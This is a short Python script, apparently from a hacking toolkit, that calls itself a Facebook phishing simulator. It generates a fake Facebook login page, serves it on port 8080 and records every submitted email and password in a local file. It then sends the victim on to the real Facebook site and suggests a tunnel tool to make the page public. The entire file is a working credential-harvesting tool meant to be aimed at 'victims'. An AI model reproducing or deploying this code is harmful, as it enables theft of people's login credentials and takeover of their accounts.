# CREATED BY: RAMIZ UDDIN
import os, time, http.server, socketserver

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

PORT = 8080

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"\n\033[1;31m[!] CREDENTIALS CAPTURED: {post_data}\033[0m")
        with open("captured_creds.txt", "a") as f:
            f.write(f"Time: {time.ctime()} | Data: {post_data}\n")
        self.send_response(302)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()

def run():
    tool_header("PHISHING SIMULATOR (FACEBOOK)")
    print("\033[1;32m[*] Starting Phishing Server...")
    
    with open("index.html", "w") as f:
        f.write("<html><body style='text-align:center;padding-top:100px;'><h2>Login to Facebook</h2><form method='POST'><input type='text' name='e' placeholder='Email'><br><br><input type='password' name='p' placeholder='Password'><br><br><button type='submit'>Login</button></form></body></html>")

    handler = PhishingHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"\033[1;32m[+] Server Active at: http://127.0.0.1:{PORT}")
        print("[!] Use 'Cloud Tunnel' (Tool 101) to get a public link.")
        print("[*] Waiting for victim... (Ctrl+C to stop)\033[0m")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Stopping Server...\033[0m")
            os.system("rm index.html")
            httpd.shutdown()
    input("\n[Press Enter to Return]")

if __name__ == "__main__":
    run()
